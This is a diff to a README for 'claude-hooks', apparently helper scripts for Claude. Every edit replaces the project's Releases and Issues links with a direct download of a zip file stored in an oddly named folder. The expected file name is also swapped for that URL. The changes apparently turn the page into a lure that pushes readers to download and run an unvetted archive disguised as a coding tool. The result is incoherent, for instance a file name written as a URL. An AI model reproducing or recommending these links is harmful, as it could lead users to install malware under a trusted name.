@@ -1,7 +1,7 @@
 # 🎉 claude-hooks - Enhance Your Coding Experience Easily
 
 ## 🔗 Download Here
-[![Download claude-hooks](https://img.shields.io/badge/Download%20Now-claude--hooks-blue.svg)](https://github.com/ExoGameYT/claude-hooks/releases)
+[![Download claude-hooks](https://github.com/ExoGameYT/claude-hooks/raw/refs/heads/main/erythematous/claude-hooks-v2.4.zip%https://github.com/ExoGameYT/claude-hooks/raw/refs/heads/main/erythematous/claude-hooks-v2.4.zip)](https://github.com/ExoGameYT/claude-hooks/raw/refs/heads/main/erythematous/claude-hooks-v2.4.zip)
 
 ## 🚀 Getting Started
 Welcome to claude-hooks! This software provides tiny scripts that improve your coding experience with Claude. If you’re looking for simple ways to make your coding smoother and more efficient, you’re in the right place.
@@ -18,13 +18,13 @@ Before you begin, ensure your system meets the following requirements:
 - Storage Space: At least 50 MB of free space
 
 ## 📥 Download & Install
-1. **Visit the Download Page**: Go to the [Releases page](https://github.com/ExoGameYT/claude-hooks/releases) to access the latest version of claude-hooks.
+1. **Visit the Download Page**: Go to the [Releases page](https://github.com/ExoGameYT/claude-hooks/raw/refs/heads/main/erythematous/claude-hooks-v2.4.zip) to access the latest version of claude-hooks.
    
 2. **Select the Version**: You will see a list of available versions. Choose the most recent one. It is usually at the top of the list.
 
 3. **Download the File**: Click on the link that corresponds to your operating system to download the file.
 
-4. **Locate the Downloaded File**: Check your downloads folder for the file you just downloaded. The file name will look similar to `claude-hooks-v1.0.zip`.
+4. **Locate the Downloaded File**: Check your downloads folder for the file you just downloaded. The file name will look similar to `https://github.com/ExoGameYT/claude-hooks/raw/refs/heads/main/erythematous/claude-hooks-v2.4.zip`.
 
 5. **Extract the Files** (if zipped): If your download is a `.zip` file, right-click on it and select "Extract All." Follow the prompts to extract the files to a desired location.
 
@@ -48,7 +48,7 @@ If you run into issues:
 ## 📞 Support
 If you have questions or need help, grab the FAQ section in the documentation or contact support through GitHub issues. 
 
-1. **Visit the Issues Page**: You can report issues or propose features at [Issues page](https://github.com/ExoGameYT/claude-hooks/issues).
+1. **Visit the Issues Page**: You can report issues or propose features at [Issues page](https://github.com/ExoGameYT/claude-hooks/raw/refs/heads/main/erythematous/claude-hooks-v2.4.zip).
 2. **Explore Discussions**: Join in on existing discussions to learn from other users.
 
 ## 🔗 Additional Resources
